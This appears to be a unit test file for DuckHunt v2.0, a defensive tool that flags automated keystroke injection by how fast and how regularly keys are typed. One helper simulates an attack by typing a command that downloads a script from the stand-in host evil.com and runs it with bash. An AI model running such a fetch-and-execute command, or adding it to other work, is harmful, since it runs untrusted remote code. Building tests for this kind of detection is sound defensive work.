"""
Unit tests for DuckHunt v2.0 Behavioral Analyzer

Tests the statistical analysis engine's ability to detect anomalies
in keystroke timing patterns.
"""

import unittest
import sys
import os
from typing import List, Dict
import time

# Add parent directory to path for imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.analyzer import BehavioralAnalyzer, KeystrokeEvent, AnalysisResult
from core.profile_manager import ProfileManager


class TestBehavioralAnalyzer(unittest.TestCase):
    """Test suite for BehavioralAnalyzer"""

    def setUp(self):
        """Set up test fixtures"""
        # Create a test profile with known characteristics
        self.profile_path = "tests/test_profile.json"
        self.profile_manager = ProfileManager(self.profile_path)

        # Initialize profile with typical human typing characteristics
        self.profile_manager.profile = {
            'version': '2.0',
            'learning_phase': 'continuous',
            'sample_count': 10000,
            'speed_distribution': {
                'mean_ms': 145.0,
                'std_dev_ms': 25.0,
                'median_ms': 140.0,
                'q1': 125.0,
                'q3': 160.0,
                'min_ms': 50.0,
                'max_ms': 500.0
            },
            'digraph_timings': {
                'th': {'mean_ms': 145.0, 'std_dev_ms': 23.0, 'samples': 100},
                'he': {'mean_ms': 132.0, 'std_dev_ms': 19.0, 'samples': 100},
                'er': {'mean_ms': 128.0, 'std_dev_ms': 21.0, 'samples': 100},
                'in': {'mean_ms': 140.0, 'std_dev_ms': 20.0, 'samples': 100}
            },
            'typing_patterns': {
                'average_speed_wpm': 65.0,
                'error_rate': 0.034,
                'correction_pattern': {
                    'immediate_backspace_pct': 0.7,
                    'delayed_correction_pct': 0.3
                }
            },
            'temporal_patterns': {
                'active_hours': [9, 10, 11, 14, 15, 16, 17],
                'typing_rhythm_variance': 0.15
            },
            'metadata': {
                'platform': 'windows',
                'keyboard_layout': 'en-US',
                'adaptive_learning_rate': 0.05
            }
        }

        self.analyzer = BehavioralAnalyzer(self.profile_manager, confidence_threshold=0.85)

    def tearDown(self):
        """Clean up test artifacts"""
        if os.path.exists(self.profile_path):
            os.remove(self.profile_path)

    def test_normal_typing_detected_as_legitimate(self):
        """Test that normal human typing is not flagged as anomalous"""
        # Simulate normal typing with typical inter-keystroke intervals
        events = self._create_normal_typing_sequence()

        for event in events:
            result = self.analyzer.analyze_keystroke(event)

            # Normal typing should have low anomaly confidence
            self.assertLess(result.confidence, 0.50,
                          f"Normal typing flagged as anomalous: {result}")
            self.assertFalse(result.is_attack,
                           "Normal typing incorrectly classified as attack")

    def test_fast_injection_detected(self):
        """Test that fast keystroke injection is detected"""
        # Simulate RubberDucky-style fast injection (10-20ms intervals)
        events = self._create_fast_injection_sequence()

        high_confidence_count = 0
        for event in events:
            result = self.analyzer.analyze_keystroke(event)

            if result.confidence >= 0.85:
                high_confidence_count += 1

        # At least 80% of fast events should be flagged
        detection_rate = high_confidence_count / len(events)
        self.assertGreater(detection_rate, 0.80,
                         f"Fast injection detection rate too low: {detection_rate:.2%}")

    def test_pattern_matching_powershell(self):
        """Test that PowerShell execution pattern is detected"""
        # Simulate typing "powershell" quickly (common attack pattern)
        events = self._create_pattern_sequence(['p','o','w','e','r','s','h','e','l','l'],
                                               interval_ms=15)

        # Analyze the sequence
        results = [self.analyzer.analyze_keystroke(event) for event in events]

        # At least one result should have high confidence due to pattern match
        max_confidence = max(r.confidence for r in results)
        self.assertGreater(max_confidence, 0.70,
                         "PowerShell pattern not detected")

    def test_zero_error_rate_flagged(self):
        """Test that zero error rate (no backspaces) is suspicious"""
        # Create a long sequence with no backspaces (bot behavior)
        events = self._create_perfect_typing_sequence(length=50)

        for event in events:
            result = self.analyzer.analyze_keystroke(event)

        # Check if zero error rate was noted
        # The analyzer tracks error rate internally
        # After 50 keystrokes with 0 errors, this should contribute to suspicion
        final_result = self.analyzer.analyze_keystroke(events[-1])

        # Zero error rate should contribute to anomaly score
        # (exact threshold depends on implementation)
        self.assertIn('error_pattern', final_result.details,
                     "Error pattern analysis not performed")

    def test_digraph_timing_anomaly(self):
        """Test that unusual digraph timing is detected"""
        # Create events with abnormal digraph timing
        # Profile says 'th' should be 145ms ± 23ms
        # We'll send 'th' at 50ms (way too fast)

        event_t = self._create_event('t', 100, inter_event_ms=150)
        event_h = self._create_event('h', 105, inter_event_ms=50)  # Abnormally fast

        self.analyzer.analyze_keystroke(event_t)
        result = self.analyzer.analyze_keystroke(event_h)

        # Should detect digraph timing anomaly
        self.assertIn('digraph_analysis', result.details,
                     "Digraph analysis not performed")

    def test_hardware_injection_flag(self):
        """Test that hardware injection flag increases confidence"""
        # Event marked as injected by OS
        event = self._create_event('a', 100, inter_event_ms=100, injected=True)

        result = self.analyzer.analyze_keystroke(event)

        # Hardware injection flag should significantly increase confidence
        self.assertGreater(result.confidence, 0.50,
                         "Hardware injection flag not weighted properly")
        self.assertTrue(result.details.get('hardware_injected', False),
                       "Hardware injection flag not recorded")

    def test_temporal_consistency(self):
        """Test that typing at unusual hours is flagged"""
        # Profile says active hours are 9-11, 14-17
        # Create event at 3 AM (unusual)

        event = self._create_event('a', 100, inter_event_ms=140)
        event.timestamp = "2025-01-06T03:00:00Z"  # 3 AM

        result = self.analyzer.analyze_keystroke(event)

        # Unusual hour should contribute to suspicion
        # (May not trigger high confidence alone, but should be noted)
        if 'temporal_consistency' in result.details:
            self.assertIsNotNone(result.details['temporal_consistency'])

    def test_zscore_calculation(self):
        """Test that z-score is calculated correctly"""
        # Mean: 145ms, StdDev: 25ms
        # Event at 20ms should have z-score of (20-145)/25 = -5.0

        event = self._create_event('a', 100, inter_event_ms=20)
        result = self.analyzer.analyze_keystroke(event)

        # Check z-score is calculated
        if 'speed_analysis' in result.details:
            speed_details = result.details['speed_analysis']
            if 'z_score' in speed_details:
                z_score = abs(speed_details['z_score'])
                self.assertGreater(z_score, 3.0,
                                 f"Z-score calculation incorrect: {z_score}")

    def test_iqr_outlier_detection(self):
        """Test that IQR method detects outliers"""
        # Q1: 125ms, Q3: 160ms, IQR: 35ms
        # Outlier threshold: Q1 - 1.5*IQR = 125 - 52.5 = 72.5ms
        # Event at 50ms should be flagged as outlier

        event = self._create_event('a', 100, inter_event_ms=50)
        result = self.analyzer.analyze_keystroke(event)

        # Should be detected as outlier
        self.assertGreater(result.confidence, 0.40,
                         "IQR outlier not detected")

    def test_continuous_learning_updates_profile(self):
        """Test that analyzer updates profile during continuous learning"""
        initial_mean = self.profile_manager.profile['speed_distribution']['mean_ms']

        # Send multiple events with slightly different timing
        events = self._create_normal_typing_sequence()
        for event in events:
            self.analyzer.analyze_keystroke(event)

        # Profile should have been updated (if continuous learning enabled)
        # Note: This assumes continuous learning is active
        # The mean might change slightly due to exponential moving average

    # Helper methods for creating test data

    def _create_event(self, key: str, timestamp: int, inter_event_ms: float,
                     injected: bool = False, window: str = "Editor") -> KeystrokeEvent:
        """Create a KeystrokeEvent for testing"""
        return KeystrokeEvent(
            timestamp=f"2025-01-06T12:00:{timestamp:02d}Z",
            key=key,
            event_type='key_down',
            inter_event_ms=inter_event_ms,
            window_name=window,
            application="VSCode",
            injected=injected,
            scan_code=0,
            is_repeat=False
        )

    def _create_normal_typing_sequence(self) -> List[KeystrokeEvent]:
        """Create a sequence simulating normal human typing"""
        import random
        events = []
        keys = list("the quick brown fox jumps over the lazy dog")

        for i, key in enumerate(keys):
            # Human typing: 100-200ms intervals with variation
            interval = random.gauss(145, 25)  # Match profile
            interval = max(80, min(250, interval))  # Clamp to reasonable range

            events.append(self._create_event(key, i, interval))

        return events

    def _create_fast_injection_sequence(self) -> List[KeystrokeEvent]:
        """Create a sequence simulating fast automated injection"""
        events = []
        keys = list("curl -o /tmp/payload http://evil.com/bad.sh && bash /tmp/payload")

        for i, key in enumerate(keys):
            # RubberDucky: 10-20ms consistent intervals
            interval = 15.0  # Very fast, very consistent
            events.append(self._create_event(key, i, interval, injected=False))

        return events

    def _create_pattern_sequence(self, keys: List[str], interval_ms: float) -> List[KeystrokeEvent]:
        """Create a specific pattern sequence"""
        events = []
        for i, key in enumerate(keys):
            events.append(self._create_event(key, i, interval_ms))
        return events

    def _create_perfect_typing_sequence(self, length: int) -> List[KeystrokeEvent]:
        """Create a sequence with no errors (no backspaces)"""
        import random
        events = []
        keys = list("abcdefghijklmnopqrstuvwxyz ")

        for i in range(length):
            key = random.choice(keys)
            interval = random.gauss(145, 25)
            interval = max(80, min(250, interval))
            events.append(self._create_event(key, i, interval))

        return events


class TestStatisticalMethods(unittest.TestCase):
    """Test statistical calculation methods"""

    def test_zscore_extreme_value(self):
        """Test z-score with extreme outlier"""
        # This tests the mathematical correctness of z-score
        mean = 145.0
        std_dev = 25.0
        value = 10.0  # Extreme outlier

        expected_zscore = (value - mean) / std_dev
        self.assertAlmostEqual(expected_zscore, -5.4, places=1)

    def test_iqr_boundaries(self):
        """Test IQR outlier boundaries"""
        q1 = 125.0
        q3 = 160.0
        iqr = q3 - q1

        lower_bound = q1 - 1.5 * iqr
        upper_bound = q3 + 1.5 * iqr

        self.assertEqual(lower_bound, 72.5)
        self.assertEqual(upper_bound, 212.5)


def run_tests():
    """Run all tests"""
    unittest.main(argv=[''], verbosity=2, exit=False)


if __name__ == '__main__':
    print("DuckHunt v2.0 - Behavioral Analyzer Unit Tests")
    print("=" * 60)
    run_tests()
